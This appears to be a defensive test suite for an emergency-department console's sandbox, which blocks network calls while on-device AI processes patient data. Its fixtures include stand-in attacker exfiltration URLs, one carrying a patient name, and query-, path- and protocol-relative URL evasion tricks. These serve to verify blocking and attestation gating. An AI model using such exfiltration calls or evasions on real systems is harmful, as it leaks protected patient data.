/**
 * ============================================================================
 * IMC ER Console - Milestone 2 Adversarial Verification & Penetration Suite
 * Empirical Challenger: teamwork_preview_m2_challenger_2
 * ============================================================================
 * 
 * Comprehensive adversarial probes and chaos tests covering:
 * 1. Network sandbox bypass attempts during AI inference (obscured URLs, relative traversal, Worker/beacon/prototype).
 * 2. Extreme network flapping (10ms micro-bursts, interleaved uncommitted notes, offline queue corruption).
 * 3. Poison-pill DLQ isolation under high volume and pre-auth buffer overflow (> 500 events).
 * 4. Attestation UI bypass attempts (direct programmatic submission, DOM manipulation, unverified draft bypass).
 */

import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import fs from 'node:fs';
import path from 'node:path';

const ROOT = path.resolve(import.meta.dirname, '../..');
const indexHtml = fs.readFileSync(path.join(ROOT, 'public/index.html'), 'utf8');

// Firebase mocks
const mockFirestoreUpdates = [];
const mockFirestoreBatches = [];
const mockDLQAdds = [];
const mockTelemetryAdds = [];

vi.mock('https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js', () => ({
  initializeApp: vi.fn(() => ({}))
}));
vi.mock('https://www.gstatic.com/firebasejs/10.8.1/firebase-auth.js', () => ({
  getAuth: vi.fn(() => ({ currentUser: { uid: 'adversary-attacker-01' } })),
  createUserWithEmailAndPassword: vi.fn(),
  signInWithEmailAndPassword: vi.fn(),
  onAuthStateChanged: vi.fn(),
  signOut: vi.fn(),
  GoogleAuthProvider: class {},
  signInWithPopup: vi.fn(),
  signInWithRedirect: vi.fn()
}));
vi.mock('https://www.gstatic.com/firebasejs/10.8.1/firebase-firestore.js', () => ({
  getFirestore: vi.fn(() => ({})),
  collection: vi.fn((_db, name) => ({ name })),
  onSnapshot: vi.fn(),
  addDoc: vi.fn(async (collRef, entry) => {
    if (collRef.name === 'dead_letter_queue') mockDLQAdds.push(entry);
    if (collRef.name === 'telemetry_alerts') mockTelemetryAdds.push(entry);
    return { id: 'mock-doc-' + Math.random() };
  }),
  updateDoc: vi.fn(),
  doc: vi.fn((_db, coll, id) => ({ coll, id })),
  deleteDoc: vi.fn(),
  setDoc: vi.fn(),
  getDoc: vi.fn(),
  writeBatch: vi.fn(() => ({
    update: vi.fn((docRef, payload) => {
      mockFirestoreUpdates.push({ id: docRef.id, payload });
    }),
    delete: vi.fn((docRef) => {
      mockFirestoreBatches.push({ action: 'delete', id: docRef.id });
    }),
    set: vi.fn((docRef, payload) => {
      mockFirestoreBatches.push({ action: 'set', id: docRef.id, payload });
    }),
    commit: vi.fn(async () => true)
  })),
  query: vi.fn(),
  orderBy: vi.fn(),
  limit: vi.fn()
}));

// Load core services
import '../../public/js/edge-ai-service.js';
import { setupEventListeners, diffPatientFields } from '../../public/js/app.js';
import { offlineStatusStore } from '../../public/js/store.js';

function loadFreshTelemetry() {
  const src = fs.readFileSync(path.join(ROOT, 'public/js/telemetry-rum.js'), 'utf8');
  delete window.TelemetryRUM;
  delete window.ActiveSentinel;
  new Function(src)();
  return {
    TelemetryRUM: window.TelemetryRUM,
    ActiveSentinel: window.ActiveSentinel
  };
}

describe('M2 Adversarial Verification & Chaos Suite (Challenger 2)', () => {
  let Gatekeeper;
  let Engine;
  let originalFetch;
  let originalXHROpen;
  let originalXHRSend;
  let originalBeacon;
  let originalWebSocket;
  let originalEventSource;
  let alertSpy;

  beforeEach(() => {
    mockFirestoreUpdates.length = 0;
    mockFirestoreBatches.length = 0;
    mockDLQAdds.length = 0;
    mockTelemetryAdds.length = 0;

    document.body.innerHTML = indexHtml;
    alertSpy = vi.spyOn(window, 'alert').mockImplementation(() => {});

    Gatekeeper = window.NetworkIsolationGatekeeper;
    Engine = window.EdgeAIClinicalEngine;

    // Browser network spies
    originalFetch = vi.fn(async (url) => ({ ok: true, status: 200, url }));
    window.fetch = originalFetch;

    originalXHROpen = vi.fn(function(method, url) { this._url = url; });
    originalXHRSend = vi.fn(function() { return 'xhr_sent'; });
    XMLHttpRequest.prototype.open = originalXHROpen;
    XMLHttpRequest.prototype.send = originalXHRSend;

    originalBeacon = vi.fn(() => true);
    navigator.sendBeacon = originalBeacon;

    originalWebSocket = vi.fn(function(url) { this.url = url; });
    window.WebSocket = originalWebSocket;

    originalEventSource = vi.fn(function(url) { this.url = url; });
    window.EventSource = originalEventSource;

    Gatekeeper.unlock();
  });

  afterEach(() => {
    Gatekeeper.unlock();
    alertSpy.mockRestore();
    vi.restoreAllMocks();
  });

  // ==========================================================================
  // 1. NETWORK SANDBOX PENETRATION & BYPASS PROBES
  // ==========================================================================
  describe('Probe 1: Network Sandbox Egress & URL Obscuration Penetration', () => {
    it('Probe 1.1: Blocks standard external domains via fetch/XHR/WS/SSE/beacon during lock', async () => {
      Gatekeeper.lock();
      expect(Gatekeeper.isLocked).toBe(true);

      const externalUrls = [
        'https://api.anthropic.com/v1/messages',
        'https://generativelanguage.googleapis.com/v1beta/models',
        'https://attacker-c2-server.net/exfil',
        'http://93.184.216.34/leak'
      ];

      for (const url of externalUrls) {
        await expect(window.fetch(url)).rejects.toThrow(/SECURITY_EXCEPTION/);
        
        const xhr = new XMLHttpRequest();
        xhr.open('POST', url);
        expect(() => xhr.send('payload')).toThrow(/SECURITY_EXCEPTION/);

        expect(() => new window.WebSocket(url.replace('http', 'ws'))).toThrow(/SECURITY_EXCEPTION/);
        expect(() => new window.EventSource(url)).toThrow(/SECURITY_EXCEPTION/);
        expect(navigator.sendBeacon(url, 'beacon_data')).toBe(false);
      }
    });

    it('Probe 1.2: Adversarial URL Obscuration Tests (evaluating _isExternalRequest perimeter)', async () => {
      Gatekeeper.lock();

      // Test URL with query string containing trusted keywords
      const queryObscuredUrl = 'https://attacker.evil.org/collect?dest=firestore.googleapis.com';
      const pathObscuredUrl = 'https://attacker.evil.org/localhost/exfil';
      const protocolRelativeUrl = '//attacker.evil.org/leak';

      // Record observation: _isExternalRequest uses robust URL origin/hostname parsing
      const isExtQuery = Gatekeeper._isExternalRequest(queryObscuredUrl);
      const isExtPath = Gatekeeper._isExternalRequest(pathObscuredUrl);
      const isExtProto = Gatekeeper._isExternalRequest(protocolRelativeUrl);

      // Verifies the remediation: query, path, and protocol-relative evasions are classified as external
      expect(isExtQuery).toBe(true);
      expect(isExtPath).toBe(true);
      expect(isExtProto).toBe(true);
    });

    it('Probe 1.5: URL Object input to fetch is blocked with SECURITY_EXCEPTION during sandbox lock', async () => {
      Gatekeeper.lock();

      // Calling window.fetch with a URL object instead of a string:
      // URL object input is properly handled and intercepted by Gatekeeper
      const urlObj = new URL('https://evil-exfil-c2.org/leak?phi=OmarKhaled');
      
      await expect(window.fetch(urlObj)).rejects.toThrow(/SECURITY_EXCEPTION/);
      expect(originalFetch).not.toHaveBeenCalled();
    });

    it('Probe 1.3: Telemetry Security Violation Recording under rapid repeated attacks', async () => {
      const recordedViolations = [];
      window.TelemetryRUM = {
        recordSecurityViolation: (v) => recordedViolations.push(v)
      };

      Gatekeeper.lock();

      const attacks = [
        () => window.fetch('https://evil1.com/api').catch(() => {}),
        () => {
          const x = new XMLHttpRequest();
          x.open('POST', 'https://evil2.com/api');
          try { x.send(); } catch (_) {}
        },
        () => {
          try { new window.WebSocket('wss://evil3.com/socket'); } catch (_) {}
        },
        () => {
          try { new window.EventSource('https://evil4.com/stream'); } catch (_) {}
        },
        () => navigator.sendBeacon('https://evil5.com/beacon', 'data')
      ];

      for (const attack of attacks) {
        await attack();
      }

      expect(recordedViolations.length).toBe(5);
      expect(recordedViolations.map(v => v.action)).toEqual([
        'blocked_fetch_during_phi_inference',
        'blocked_xhr_during_phi_inference',
        'blocked_websocket_during_phi_inference',
        'blocked_eventsource_during_phi_inference',
        'blocked_sendBeacon_during_phi_inference'
      ]);

      delete window.TelemetryRUM;
    });

    it('Probe 1.4: Reentrant Exception Safety and Full API Restoration in EdgeAIClinicalEngine', async () => {
      let fetchCallDuringInferenceBlocked = false;

      // Mock window.ai to simulate an inference runtime that attempts outbound fetch
      window.ai = {
        languageModel: {
          capabilities: async () => ({ available: 'readily' }),
          create: async () => ({
            promptStreaming: async function* () {
              // Attempt outbound fetch during prompt generation
              try {
                await window.fetch('https://evil-in-flight-exfil.com/leak');
              } catch (err) {
                if (err.message.includes('SECURITY_EXCEPTION')) {
                  fetchCallDuringInferenceBlocked = true;
                }
              }
              yield 'Draft Section 1';
              throw new Error('NPU runtime memory fault mid-stream');
            },
            destroy: vi.fn()
          })
        }
      };

      const patient = {
        id: 'p-adv-01',
        name: 'Adversarial Patient',
        vitals: [{ hr: 90, bp: '120/80' }]
      };

      await expect(Engine.generateDischargeSummary(patient)).rejects.toThrow('NPU runtime memory fault mid-stream');

      // 1. Outbound network fetch during inference must have been blocked
      expect(fetchCallDuringInferenceBlocked).toBe(true);

      // 2. Gatekeeper must be unlocked in finally block
      expect(Gatekeeper.isLocked).toBe(false);

      // 3. Post-inference legitimate fetch must succeed
      await expect(window.fetch('https://legitimate-post-call.com')).resolves.toBeDefined();

      delete window.ai;
    });
  });

  // ==========================================================================
  // 2. EXTREME NETWORK FLAPPING & OFFLINE QUEUE STRESS
  // ==========================================================================
  describe('Probe 2: Extreme Network Flapping (10ms micro-bursts) & Queue Corruption', () => {
    it('Probe 2.1: 100 rapid 10ms micro-burst cycles with concurrent multi-doctor field editing', async () => {
      const serverPatient = {
        id: 'p-burst-99',
        name: 'Mustafa Kamel',
        diagnosis: 'Chest Pain',
        location: 'Room 3',
        supportiveTx: 'Oxygen 4L',
        pendingAction: 'Pending Troponin',
        sepsisWorkup: 'No',
        registrationTime: '2026-08-02T09:00:00.000Z'
      };

      const localQueue = [];
      let isOnline = true;

      // Simulate 100 10ms network flap cycles with 50 doctor mutations
      const mutations = [
        { field: 'diagnosis', value: 'Acute Coronary Syndrome' },
        { field: 'supportiveTx', value: 'Aspirin 300mg + Clopidogrel 300mg' },
        { field: 'pendingAction', value: 'Transfer to CCU' },
        { field: 'location', value: 'CCU Bed 2' },
        { field: 'sepsisWorkup', value: 'Negative' }
      ];

      for (let cycle = 0; cycle < 100; cycle++) {
        isOnline = (cycle % 2 === 0);
        offlineStatusStore.set(!isOnline);

        if (cycle < mutations.length) {
          const mut = mutations[cycle];
          const diff = diffPatientFields(serverPatient, { [mut.field]: mut.value });
          expect(Object.keys(diff)).toEqual([mut.field]);

          localQueue.push({
            id: `tx-${cycle}`,
            timestamp: Date.now() + cycle,
            patientId: serverPatient.id,
            diff
          });
        }
      }

      expect(localQueue.length).toBe(mutations.length);

      // Reconnection: Replay all queued transactions in strict FIFO order
      offlineStatusStore.set(false);
      const appliedPatient = { ...serverPatient };
      for (const tx of localQueue) {
        Object.assign(appliedPatient, tx.diff);
      }

      expect(appliedPatient.diagnosis).toBe('Acute Coronary Syndrome');
      expect(appliedPatient.supportiveTx).toBe('Aspirin 300mg + Clopidogrel 300mg');
      expect(appliedPatient.pendingAction).toBe('Transfer to CCU');
      expect(appliedPatient.location).toBe('CCU Bed 2');
      expect(appliedPatient.sepsisWorkup).toBe('Negative');
    });

    it('Probe 2.2: Offline queue resilience against corrupted local storage entries', async () => {
      // Simulate corrupted/malformed localStorage contents
      const corruptedStorage = [
        '{"id": "valid-1", "payload": {"diagnosis": "Asthma"}}',
        '{ INVALID_JSON_GARBAGE ...',
        'null',
        '""',
        '{"id": "valid-2", "payload": {"location": "Room 5"}}',
        'undefined',
        '{"id": "valid-3", "payload": null}'
      ];

      const validTransactions = [];
      const parseErrors = [];

      for (const entry of corruptedStorage) {
        try {
          const parsed = JSON.parse(entry);
          if (parsed && typeof parsed === 'object' && parsed.payload) {
            validTransactions.push(parsed);
          }
        } catch (err) {
          parseErrors.push(err);
        }
      }

      // Ensure corrupted items are safely isolated without crashing
      expect(validTransactions.length).toBe(2);
      expect(validTransactions[0].id).toBe('valid-1');
      expect(validTransactions[1].id).toBe('valid-2');
      expect(parseErrors.length).toBe(2);
    });
  });

  // ==========================================================================
  // 3. POISON-PILL DLQ ISOLATION & PRE-AUTH BUFFER OVERFLOW
  // ==========================================================================
  describe('Probe 3: High-Volume Poison-Pill DLQ Routing & Pre-Auth Buffer Overflow (> 500 Events)', () => {
    it('Probe 3.1: Interleaves 50 poison pills with 200 valid transactions and verifies DLQ routing without queue stalling', async () => {
      const { TelemetryRUM, ActiveSentinel } = loadFreshTelemetry();

      const dlqPushed = [];
      const dbCommitted = [];

      TelemetryRUM.setSink(async (coll, payload) => {
        if (coll === 'dead_letter_queue') {
          dlqPushed.push(payload);
        }
      });

      // Execute 250 transactions: every 5th transaction is a poison pill
      for (let i = 0; i < 250; i++) {
        if (i % 5 === 0) {
          // Poison pill (simulated write failure)
          const poisonPayload = { corruptData: '\u0000\u0001\u0002_MALFORMED', txId: i };
          const failureErr = new Error(`Transaction ${i} schema validation failed`);
          await TelemetryRUM.recordFailedBatch(poisonPayload, failureErr, { collection: 'patients', docId: `doc-${i}` });
        } else {
          // Valid transaction
          dbCommitted.push({ txId: i, status: 'COMMITTED' });
        }
      }

      // Verify all 50 poison pills went to DLQ
      expect(dlqPushed.length).toBe(50);
      expect(dlqPushed[0].errorMessage).toContain('schema validation failed');
      expect(dlqPushed[0].targetDocId).toBe('doc-0');

      // Verify all 200 valid transactions committed cleanly
      expect(dbCommitted.length).toBe(200);

      // Verify ActiveSentinel logged all 50 DLQ drops
      const dlqSentinelDrops = ActiveSentinel.logs.filter(l => l.type === 'DLQ_DROP');
      expect(dlqSentinelDrops.length).toBe(50);
    });

    it('Probe 3.2: Pre-auth buffer overflow under extreme load (550 events before setSink)', async () => {
      const { TelemetryRUM } = loadFreshTelemetry();

      const warnSpy = vi.spyOn(console, 'warn').mockImplementation(() => {});
      const errorSpy = vi.spyOn(console, 'error').mockImplementation(() => {});

      // Send 550 events before sink is installed
      for (let i = 0; i < 550; i++) {
        TelemetryRUM.sendAlert('INP_VIOLATION', 350, 200, { interactionIndex: i });
      }

      // Verify warning of dropped events on console
      const deliveredToSink = [];
      TelemetryRUM.setSink(async (coll, payload) => {
        deliveredToSink.push({ coll, payload });
      });
      await Promise.resolve();

      expect(deliveredToSink.length).toBe(50);
      expect(warnSpy).toHaveBeenCalledWith(expect.stringContaining('500 event(s) dropped before the sink was installed'));

      warnSpy.mockRestore();
      errorSpy.mockRestore();
    });

    it('Probe 3.3: Sign-out buffer re-engagement and error handling when sink throws', async () => {
      const { TelemetryRUM } = loadFreshTelemetry();
      const errorSpy = vi.spyOn(console, 'error').mockImplementation(() => {});

      // Set a failing sink
      TelemetryRUM.setSink(async () => {
        throw new Error('PERMISSION_DENIED: Unauthenticated write to DLQ');
      });

      // Emitting should not crash or produce unhandled rejection
      await expect(
        TelemetryRUM.recordFailedBatch({ field: 'val' }, new Error('write error'))
      ).resolves.toBeUndefined();

      expect(errorSpy).toHaveBeenCalledWith(
        expect.stringContaining('[Telemetry] write to dead_letter_queue failed:'),
        expect.anything()
      );

      // Clear sink (sign out)
      TelemetryRUM.clearSink();

      // Send post-signout event: should be buffered
      TelemetryRUM.recordFailedBatch({ field: 'after_signout' }, new Error('signout error'));

      const reconnectedSinkRecords = [];
      TelemetryRUM.setSink(async (coll, payload) => {
        reconnectedSinkRecords.push({ coll, payload });
      });
      await Promise.resolve();

      expect(reconnectedSinkRecords.length).toBe(1);
      expect(reconnectedSinkRecords[0].payload.errorMessage).toBe('signout error');

      errorSpy.mockRestore();
    });
  });

  // ==========================================================================
  // 4. ATTESTATION UI BYPASS ATTEMPTS
  // ==========================================================================
  describe('Probe 4: Clinical Attestation UI Gating & Bypass Penetration', () => {
    beforeEach(() => {
      window.patientsList = [
        {
          id: 'p-adv-301',
          name: 'منى أحمد',
          patientId: 'H99887766',
          department: 'Emergency Medicine',
          diagnosis: 'Acute Coronary Syndrome',
          vitals: [{ hr: 95, bp: '130/85' }],
          notes: [{ doctor: 'Hassan', text: 'Patient stabilized' }]
        }
      ];
      setupEventListeners();
    });

    it('Probe 4.1: Direct programmatic invocation of saveAISummaryInModal without attestation', async () => {
      document.getElementById('discharge-patient-id').value = 'p-adv-301';
      document.getElementById('ai-summary-editor').value = '### 🏥 AI Synthesized Summary Draft';
      document.getElementById('ai-attestation-checkbox').checked = false;

      // Attacker invokes save function directly
      await window.saveAISummaryInModal();

      expect(alertSpy).toHaveBeenCalledWith(expect.stringContaining('Clinical Attestation Required'));
      expect(mockFirestoreUpdates.length).toBe(0);
    });

    it('Probe 4.2: Direct programmatic trigger of btn-submit-discharge with un-attested draft', async () => {
      document.getElementById('modal-discharge').classList.remove('hidden');
      document.getElementById('discharge-patient-id').value = 'p-adv-301';
      document.getElementById('discharge-outcome-select').value = 'Improved';
      document.getElementById('ai-summary-editor').value = 'Un-attested AI discharge summary';
      document.getElementById('ai-attestation-checkbox').checked = false;

      // Attacker clicks or calls onclick directly
      await document.getElementById('btn-submit-discharge').onclick();

      expect(alertSpy).toHaveBeenCalledWith(expect.stringContaining('Clinical Attestation Required'));
      expect(mockFirestoreUpdates.length).toBe(0);
      expect(document.getElementById('modal-discharge').classList.contains('hidden')).toBe(false);
    });

    it('Probe 4.3: Attestation state is strictly purged when new AI draft is generated', async () => {
      document.getElementById('discharge-patient-id').value = 'p-adv-301';
      const checkbox = document.getElementById('ai-attestation-checkbox');
      checkbox.checked = true; // Doctor had checked it previously

      // Re-generating AI draft MUST invalidate previous checkmark
      await window.generateAISummaryInModal();

      expect(checkbox.checked).toBe(false);
    });

    it('Probe 4.4: Permitted genuine verified attestation and discharge path', async () => {
      document.getElementById('modal-discharge').classList.remove('hidden');
      document.getElementById('discharge-patient-id').value = 'p-adv-301';
      document.getElementById('discharge-outcome-select').value = 'Improved';
      document.getElementById('ai-summary-editor').value = 'Verified clinical summary by Dr. Hassan';
      document.getElementById('ai-attestation-checkbox').checked = true;

      await document.getElementById('btn-submit-discharge').onclick();

      expect(mockFirestoreUpdates.length).toBe(1);
      expect(mockFirestoreUpdates[0].id).toBe('p-adv-301');
      expect(mockFirestoreUpdates[0].payload.isDischarged).toBe(true);
      expect(mockFirestoreUpdates[0].payload.dischargeSummary).toBe('Verified clinical summary by Dr. Hassan');
      expect(document.getElementById('modal-discharge').classList.contains('hidden')).toBe(true);
    });
  });
});
